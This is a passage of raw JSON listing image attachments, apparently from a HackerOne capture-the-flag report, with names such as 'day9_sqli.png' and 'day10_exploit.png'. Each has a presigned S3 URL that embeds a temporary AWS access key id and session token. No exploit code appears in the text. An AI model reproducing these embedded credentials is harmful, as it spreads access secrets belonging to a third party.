WNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9532aaff1f64e6e8feac4e4f2a63aa4db7c721b0192f6b2472646d9273fec3a3"},{"id":1139703,"filename":"day9_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/278gmaf86vqf6tmtwih7xgctl2ov?response-content-disposition=attachment%3B%20filename%3D%22day9_index.png%22%3B%20filename%2A%3DUTF-8%27%27day9_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8b2bf238a2fac0f673ec29acfb5b02270ccab6d9f4713c39bebeb9c9df598c51"},{"id":1139704,"filename":"day9_sqli.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cbtnd4jpbbdfponprv2mnos8mysu?response-content-disposition=attachment%3B%20filename%3D%22day9_sqli.png%22%3B%20filename%2A%3DUTF-8%27%27day9_sqli.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=08fd2e84255d77d85be5e65a6704577f624f2bad0423e6e09a23e5651156d4e3"},{"id":1139705,"filename":"day9_union.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kmeauckiscpkv93ky05a2h66zaok?response-content-disposition=attachment%3B%20filename%3D%22day9_union.png%22%3B%20filename%2A%3DUTF-8%27%27day9_union.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4f2730f10614d839425e9442b9b6d2d169dbd1ef77fe944f573e02fb93e2bd80"},{"id":1139706,"filename":"day10_exploit.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3lgrgkqci60vzapxw3gqv6mde9dc?response-content-disposition=attachment%3B%20filename%3D%22day10_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27day10_exploit.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=037a6f0357ef6b222e16e62b1e53a3f2c53b8fd7e05081a0e3946150665c3019"},{"id":1139707,"filename":"day10_flag.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h5e294lkil2hdl7wp5r95xat1wrx?response-content-disposition=attachment%3B%20filename%3D%22day10_flag.png%22%3B%20filename%2A%3DUTF-8%27%27day10_flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=96f8988fc44dabfbb2c749496f8d0d44032d7aa9d14a2304d020597743869055"},{"id":1139708,"filename":"day10_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5kd5t92bd9wwy6gl8168dtx7ywu9?response-content-disposition=attachment%3B%20filename%3D%22day10_index.png%22%3B%20filename%2A%3DUTF-8%27%27day10_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=901e38f4daa8d02b291be857b7076c50f53c2481fbb4bd50b8779d30bf2d5808"},{"id":1139709,"filename":"day10_source.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/evw3qbe7yxqhqxo47a48o2os6rmf?response-content-disposition=attachment%3B%20filename%3D%22day10_source.png%22%3B%20filename%2A%3DUTF-8%27%27day10_source.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8f3c682734f35302aeeeb505c319844b0bef7734e0a0444cf0f6e05e48251ffb"},{"id":1139710,"filename":"day10_login.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l8j7ck65pcrdce8utm03i3uqilzz?response-content-disposition=attachment%3B%20filename%3D%22day10_login.png%22%3B%20filename%2A%3DUTF-8%27%27day10_login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c65fc95176e877c4acd2176f414b3e943edf58841ae4f699af8b96dea011aee3"},{"id":1139711,"filename":"day10_zipfile.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8ok7t3lg6ftf5tsqzdmwwvty5k0r?response-content-disposition=attachment%3B%20filename%3D%22day10_zipfile.png%22%3B%20filename%2A%3DUTF-8%27%27day10_zipfile.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9f375ae19fc559e36231e67bb82b8a0d1e8b2b3142c3b36de0741d2035af101e"},{"id":1139712,"filename":"day11_API.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zlmpht6k2yc2r6oo7e95u2pq932i?response-content-disposition=attachment%3B%20filename%3D%22day11_API.png%22%3B%20filename%2A%3DUTF-8%27%27day11_API.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmB